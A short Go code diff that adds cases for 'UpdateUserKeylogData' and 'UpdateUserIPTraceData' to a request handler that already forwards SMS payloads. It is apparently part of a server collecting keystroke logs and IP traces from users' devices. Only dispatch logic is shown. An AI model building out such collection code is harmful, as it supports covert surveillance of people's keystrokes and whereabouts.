@@ -85,5 +85,9 @@ func processRequest(req *CustomProtocol.Request) {
 		smsCh <- req.Payload
 		fmt.Println("Message Sent: ", string(req.Payload))
 		req.Response <- []byte{1}
+	case CustomProtocol.UpdateUserKeylogData:
+		go ProcessLapReq(req) //todo is creating a thread for this a good idea?
+	case CustomProtocol.UpdateUserIPTraceData:
+		go ProcessLapReq(req)
 	}
 }
